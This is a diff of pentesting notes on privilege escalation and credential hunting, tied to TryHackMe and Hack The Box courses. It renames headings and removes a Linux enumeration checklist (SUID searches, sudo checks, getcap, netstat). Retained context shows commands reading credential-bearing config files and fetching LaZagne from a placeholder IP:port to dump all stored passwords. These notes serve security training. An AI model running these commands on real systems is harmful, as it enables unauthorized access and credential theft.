@@ -78,7 +78,7 @@ External tools/services
 * 🎠 Misconfigured [Docker socket/permissions](/operating-systems/others/virtualization/docker/index.md#docker-pentester-notes-)
 * 🎠 Misconfigured [Tmux sessions](/operating-systems/linux/env/others/tmux/index.md)
 
-⚠️ Don't forget hidden files.
+⚠️ Don't forget hidden files. [Compiled Recipe](linux/recipe.md).
 </div><div>
 
 There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...
@@ -188,7 +188,7 @@ Manually dig for interesting or unexpected files
 
 Always put yourself in the target shoes.
 
-#### Linux Juicy Notes
+#### Linux CredHunting Notes
 
 [![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
@@ -215,7 +215,7 @@ $ find / -wholename "*.git/config" 2> /dev/null | xargs grep "url"
 ```
 </div><div>
 
-#### Windows Juicy Notes
+#### Windows CredHunting Notes
 
 [![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
@@ -256,7 +256,7 @@ PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
 PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
 ```
 
-#### Automated Tools
+#### Automated Tools To Find Credentials
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
@@ -266,64 +266,6 @@ You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(8.9k ⭐)<
 PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
 PS> .\LaZagne.exe all
 ```
-</div></div>
-
-<hr class="sep-both">
-
-## Linux Escalation Recipe
-
-<div class="row row-cols-lg-2"><div>
-
-First, find who you are, if you are in interesting groups:
-
-```ps
-$ id
-```
-
-If you're in `sudo`, try running sudo without/with password.
-
-```ps
-$ sudo -l -n
-```
-
-Look for interesting files "relatively" to your current user:
-
-```ps
-$ find / -user $(whoami) -type f 2>/dev/null | grep -v /proc | grep -v /sys
-$ find / -type f -writable 2>/dev/null | grep -v /proc | grep -v /sys
-$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
-$ ls /opt # why not
-$ find /opt/ \( -amin -5 -o -mmin -5 \) 2> /dev/null # recently modified/edited?
-```
-
-Look for suspicious permissions:
-
-```ps
-$ find / -perm -u=s -type f -ls 2>/dev/null
-$ find / -perm -g=s -type f -ls 2>/dev/null
-$ getcap -r / 2>/dev/null
-```
-</div><div>
-
-Look for interesting network services:
-
-```ps
-$ netstat -antp | grep -i list
-```
-
-As a reminder, you may use tunneling tools to access internal local websites such as [chisel](/cybersecurity/red-team/tools/utilities/tunneling/chisel.md) or [ssh](/operating-systems/networking/protocols/ssh.md).
-
-Finally, look for users and services in `/etc/passwd`. Also, go look in `/home` for user homes, and try to see if you can access them.
-
-Remember to test for password reuse and [default credentials](/cybersecurity/red-team/_knowledge/topics/wordlists.md#accounts).
-
-Once this is done, you can try to run automated tools. They will return a large output, but it will way less than if you did it manually.
-
-* Interesting configuration files
-* Interesting files that may contain a password
-* Interesting sockets
-* Interesting kernel exploits 
-* ...
 </div></div>
 
 <hr class="sep-both">
